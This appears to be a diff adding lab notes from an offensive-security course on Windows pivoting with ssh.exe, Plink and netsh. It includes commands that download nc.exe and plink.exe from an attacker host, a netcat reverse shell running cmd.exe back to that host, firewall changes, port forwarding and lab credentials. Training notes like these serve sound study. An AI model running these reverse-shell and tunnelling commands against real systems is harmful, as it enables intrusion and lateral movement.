@@ -216,15 +216,213 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
+## SSH.exe
+
+The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update),1 and has been available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators Update).2 On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-\* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.
+
+```
+C:\Users\rdp_admin>where ssh
+C:\Windows\System32\OpenSSH\ssh.exe
+
+C:\Users\rdp_admin>
+```
+
+Notably, the version of OpenSSH bundled with Windows is higher than 7.6, meaning we can use it for remote dynamic port forwarding.
+
+```
+C:\Users\rdp_admin>ssh.exe -V
+OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
+```
+
+```
+C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4
+The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
+ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.118.4' (ECDSA) to the list of known hosts.
+kali@192.168.118.4's password:
+
+```
+
+```
+kali@kali:~$ tail /etc/proxychains4.conf             
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998
+
+```
+
 ## PLINK.exe
 
-from pwk pdf manual page 610. 20.3 chapter
+```
+You need to have SYSTEM rights on the windows box.
+```
 
 this looks promising [https://www.pc-freak.net/blog/creating-ssh-tunnel-windows-plink/](https://www.pc-freak.net/blog/creating-ssh-tunnel-windows-plink/)
 
+```
+kali@kali:~$ sudo systemctl start apache2
+[sudo] password for kali: 
+
+kali@kali:~$
+```
+
+```
+kali@kali:~$ find / -name nc.exe 2>/dev/null
+/usr/share/windows-resources/binaries/nc.exe
+
+kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+```
+
+```
+powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
+
+```
+
+```
+nc -nvlp 4446
+```
+
+```
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
+```
+
+```
+kali@kali:~$ find / -name plink.exe 2>/dev/null
+/usr/share/windows-resources/binaries/plink.exe
+
+kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+[sudo] password for kali: 
+
+kali@kali:~$ 
+```
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
+
+c:\windows\system32\inetsrv>
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+y
+```
+{% endcode %}
+
+{% hint style="info" %}
+In much the same way that it's not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt. An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. This will emulate the confirmation that we usually type when prompted. The entire command would be: cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.
+{% endhint %}
+
+```
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+```
+
 ## NETSH
 
-chapter 20.4 pwk pdf. this is used for port forwarding on Windows. You need to have SYSTEM rights on the windows box.&#x20;
+{% hint style="info" %}
+The portproxy subcontext of the netsh interface command requires administrative privileges to make any changes. This means that in most cases we will need to take UAC into account. In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern. However, we should bear in mind that UAC may be a stumbling block in other setups.
+{% endhint %}
+
+```
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
+```
+
+In our RDP session, we can run cmd.exe as administrator to open a command window.
+
+Using this window, we can run Netsh. We'll instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215).
+
+{% code overflow="wrap" %}
+```
+C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+
+C:\Windows\system32>
+
+```
+{% endcode %}
+
+```
+C:\Windows\system32>netstat -anp TCP | find "2222"
+  TCP    192.168.50.64:2222     0.0.0.0:0              LISTENING
+
+C:\Windows\system32>
+```
+
+```
+C:\Windows\system32>netsh interface portproxy show all
+
+Listen on ipv4:             Connect to ipv4:
+
+Address         Port        Address         Port
+--------------- ----------  --------------- ----------
+192.168.50.64   2222        10.4.50.215     22
+```
+
+```
+kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:27 EDT
+Nmap scan report for 192.168.50.64
+Host is up (0.00055s latency).
+
+PORT     STATE    SERVICE
+2222/tcp filtered EtherNetIP-1
+MAC Address: 00:0C:29:A9:9F:3D (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
+
+```
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+Ok.
+
+C:\Windows\system32>
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-21 06:28 EDT
+Nmap scan report for 192.168.50.64
+Host is up (0.00060s latency).
+
+PORT     STATE SERVICE
+2222/tcp open  EtherNetIP-1
+MAC Address: 00:0C:29:A9:9F:3D (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
+```
+{% endcode %}
+
+Using netsh advfirewall firewall, we can delete the rule, referencing it by its catchy name: "port\_forward\_ssh\_2222".
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+Deleted 1 rule(s). Ok.
+ 
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+
+C:\Windows\Administrator>
+
+```
+{% endcode %}
 
 ## Chisel
 
